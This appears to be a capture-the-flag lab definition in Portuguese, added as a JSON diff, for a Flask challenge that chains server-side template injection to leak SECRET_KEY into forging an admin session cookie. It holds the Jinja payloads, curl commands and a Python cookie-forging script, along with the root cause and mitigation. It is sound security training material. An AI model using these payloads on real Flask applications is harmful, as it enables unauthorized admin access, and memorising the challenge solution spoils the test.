@@ -1,0 +1,35 @@
+{
+  "slug": "chain-ssti-to-flask-config",
+  "title": "Template de confiança",
+  "codename": "TERRAFORM DESK",
+  "summary": "O Terraform Desk renderiza previews de notificação com render_template_string, o que expõe a config do Flask ao contexto do template. O SECRET_KEY da aplicação assina seu cookie de sessão, e uma vez conhecida essa chave um SecureCookieSession forjado torna o chamador um administrador.",
+  "category": "chain",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "chain-ssti-to-flask-config",
+  "estimated_minutes": 35,
+  "xp": 300,
+  "tech": ["Flask", "Jinja2", "Flasksessions", "SSTI", "Cookie forgery"],
+  "tags": ["chaining", "ssti", "secret-leak", "session-forgery", "flask"],
+  "story": "O Terraform Desk envia notificações de provisionamento, e seu compositor permite aos operadores pré-visualizar uma mensagem renderizando dados do destinatário via Jinja. O preview roda com todos os globals de template, então `config` está ao alcance. O mesmo SECRET_KEY alimenta o SecureCookieSession do Flask, e o console de admin confia na claim `is_admin` dentro dele.",
+  "objective": "Use server-side template injection no preview para ler o SECRET_KEY da aplicação, assine um cookie Flask SecureCookieSession declarando `is_admin: true` e abra /admin para obter a flag.",
+  "rules": "Fique na origem loopback atribuída. A conta de operador da demonstração é `operator` / `Terraform-2026!`. Resete o lab para rotacionar a chave de assinatura e invalidar cookies forjados. As flags são dinâmicas e têm o estado verificado.",
+  "flags": [
+    {"key": "flag", "label": "Flag do console de admin", "flag_type": "root", "points": 300, "required": true, "requires_objective": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "O nome é um template", "body": "`/` renderiza o `name` do destinatário com `render_template_string`. Use a sintaxe Jinja `{{ 6*7 }}` e tente alcançar um objeto Python a partir do contexto do template.", "cost": 15},
+    {"level": 2, "title": "config é o chaveiro", "body": "O Flask injeta `config`, `request`, `session` e `g`. `{{config}}` despeja toda a configuração; a chave de assinatura está em `{{config['SECRET_KEY']}}`.", "cost": 25},
+    {"level": 3, "title": "Assine sua própria sessão", "body": "O cookie é um `SecureCookieSession` do Flask (itsdangerous + JSON com tags). Com a chave, use `flask.sessions.SecureCookieSessionInterface().get_signing_serializer(app)` em uma app Flask local com o mesmo `secret_key` para fazer `dumps({'user':'operator','role':'admin','is_admin':True})` e envie o resultado como `tf_session` para `/admin`.", "cost": 30}
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — faça login como operador.**\n\n```bash\ncurl -s -c jar -X POST http://127.0.0.1:PORT/login -d 'username=operator&password=Terraform-2026!'\ncurl -s -b jar http://127.0.0.1:PORT/debug/session\n# {\"cookie\":\"tf_session\",\"interface\":\"flask.sessions.SecureCookieSessionInterface\",\"claims\":{...}}\ncurl -s -b jar -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:PORT/admin   # 403\n```\n\n**Etapa 2 — SSTI -> config.**\n\n```bash\ncurl -s -G http://127.0.0.1:PORT/ -b jar \\\n  --data-urlencode \"name={{config}}\" --data-urlencode 'email=x' | grep -o 'SECRET_KEY[^,]*'\ncurl -s -G http://127.0.0.1:PORT/ -b jar \\\n  --data-urlencode \"name={{config['SECRET_KEY']}}\" --data-urlencode 'email=x'\n# Welcome aboard, terraform-<random>! ...\n```\n\n**Etapa 3 — forje o cookie de sessão.** Use a interface real do Flask para que a assinatura, o marcador de versão do itsdangerous e o JSON com tags batam:\n\n```bash\npython3 - <<'PY'\nfrom flask import Flask\nfrom flask.sessions import SecureCookieSessionInterface\nsecret = 'terraform-<random>'\nshim = Flask('forger'); shim.secret_key = secret\nserializer = SecureCookieSessionInterface().get_signing_serializer(shim)\nprint(serializer.dumps({'user': 'operator', 'role': 'admin', 'is_admin': True}))\nPY\n```\n\n**Etapa 4 — admin.**\n\n```bash\ncurl -s http://127.0.0.1:PORT/admin -H \"Cookie: tf_session=$FORGED\"\n# <pre>RV{...}</pre>\n```\n\nUm cookie assinado com qualquer outra chave é rejeitado com 403, e a flag permanece oculta para a sessão de operador.",
+    "root_cause": "O recurso de preview passa a entrada do operador por `render_template_string`, que monta um template a partir de uma string e o avalia com o contexto de template completo do Flask: `config`, `request`, `session` e `g`. Jinja não é um sandbox, então o template pode ler valores arbitrários — aqui `app.config['SECRET_KEY']`. Como a sessão padrão do Flask é um SecureCookieSession no lado do cliente assinado por essa chave, conhecer a chave equivale à capacidade de emitir qualquer sessão. O console de admin confia em uma claim simples `is_admin`, sem store no servidor, sem rotação e sem separação entre segredos de assinatura e autorização de sessão. Uma única avaliação de template, portanto, escala para administrador.",
+    "mitigation": "Nunca renderize entrada de usuário como template: passe dados como variáveis de template (`render_template('welcome.html', name=name)`) e faça escape na saída. Se templates precisarem ser fornecidos pelo usuário, use `jinja2.sandbox.SandboxedEnvironment` e nunca exponha `config`/`globals`. Mantenha a chave de assinatura longa, aleatória e fora do contexto do template (segredos separados por finalidade, rotacionados regularmente), e evite armazenar decisões de autorização como `is_admin` em cookies do cliente — mantenha a autoridade no servidor ou use um token assinado e validado no servidor com TTL curto. Adicione regras de WAF para `{{`/`{%` em campos de formulário e alerte sobre erros de template que referenciem dunders do Python."
+  },
+  "references": [
+    {"title": "PortSwigger Web Security Academy — Server-side template injection", "url": "https://portswigger.net/web-security/server-side-template-injection", "source_type": "official", "description": "Detecção de SSTI e como alcançar objetos da aplicação, como config, pelo contexto do template."},
+    {"title": "Flask documentation — Sessions", "url": "https://flask.palletsprojects.com/en/stable/quickstart/#sessions", "source_type": "official", "description": "Como o Flask assina cookies de sessão com SECRET_KEY e por que a chave deve permanecer secreta."},
+    {"title": "itsdangerous documentation — Signing Interface", "url": "https://itsdangerous.palletsprojects.com/en/stable/signer/", "source_type": "official", "description": "O formato de assinatura por trás do cookie SecureCookieSession do Flask e como as assinaturas são verificadas."}
+  ]
+}
